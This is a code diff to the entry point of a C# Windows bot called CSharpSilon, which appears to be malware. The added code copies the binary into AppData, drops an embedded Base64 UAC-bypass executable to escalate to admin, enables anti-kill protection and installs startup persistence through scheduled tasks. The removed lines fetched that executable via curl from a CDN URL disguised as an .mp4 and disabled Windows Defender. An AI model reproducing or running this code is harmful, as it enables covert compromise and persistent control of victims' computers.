@@ -1,17 +1,22 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
+using CSharpSilion;
+using CSharpSilon.Utils;
 using CSharpSilon.Utils;
 
 namespace CSharpSilon
 {
     class Program
     {
+
+        
         static async Task Main(string[] args)
         {
-            //StartBot(); // I Use This For Testing <3
+            StartBot(); // I Use This For Testing <3
             
             
             // Checks If The .exe Was Started With 1 Argument. Then Starts It With The Silent Argument.
@@ -45,14 +50,24 @@ namespace CSharpSilon
 
         static async Task StartBot()
         {
-            //This Is Used For UAC Bypassing. Source To The File: https://github.com/hfiref0x/UACME
-            string tempPath = Environment.ExpandEnvironmentVariables("%temp%");
-            string filePath = Path.Combine(tempPath, "kudos.exe");
-            if (!File.Exists(filePath))
+            if (Config.Install && Process.GetCurrentProcess().MainModule.FileName != $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{Process.GetCurrentProcess().ProcessName}.exe")
             {
-                App.execute($"curl https://cdn.glitch.global/468fb133-32f7-4d65-815f-b96df918472c/kudos.mp4?v=1725894225335 --output {filePath}");
+                try
+                {
+                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{Process.GetCurrentProcess().ProcessName}.exe", true);
+                    App.execute(Process.GetCurrentProcess().MainModule.FileName);
+                    Environment.Exit(0);
+                }
+                catch { }
             }
             
+            
+            //This Is Used For UAC Bypassing. Source To The File: https://github.com/hfiref0x/UACME
+            string filePath = Path.Combine(Path.GetTempPath(), "kudos.exe");
+            if (!File.Exists(filePath))
+            {
+                File.WriteAllBytes(filePath, Convert.FromBase64String(Resources.ResourceManager.GetObject("kudos.txt").ToString()));
+            }
             if (!App.IsAdmin())
             {
                 if (!File.Exists(filePath))
@@ -62,13 +77,43 @@ namespace CSharpSilon
                         Thread.Sleep(750);
                     }
                 }
-                
                 //Restarts The App As Admin, Then Exits The Current Process
                 App.execute($"{filePath} 61 {Process.GetCurrentProcess().MainModule.FileName}");
                 Environment.Exit(0);
             }
-            App.Disable(); // Disables Window's Defender
-            App.ExcludeAll(); // Exclude's All Processes From Window's Defender
+
+            if (App.IsAdmin() && Config.AntiKill)
+            {
+                AntiKill.Enable();
+            }
+            
+            // Prevents Multiple Processes From Running.
+            var curProc = Process.GetCurrentProcess();
+            var procs = Process.GetProcessesByName(curProc.ProcessName);
+            if (procs.Length > 1)
+            {
+                Environment.Exit(0);
+            }
+            
+            // Put's The Bot On Startup Automatically If The User Wants It To Be
+            if (Config.OnStartup)
+            {
+                if (App.IsAdmin() && !schtasks.GetStartup())
+                {
+                    schtasks.HandleStartup();
+                }
+                else
+                {
+                    if (!NormalStartup.GetStartup())
+                    {
+                        NormalStartup.HandleStartup();
+                    }
+                }
+            }
+            
+            
+
+
             var bot = new Bot();
             bot.RunAsync().GetAwaiter().GetResult();
             Console.ReadLine();
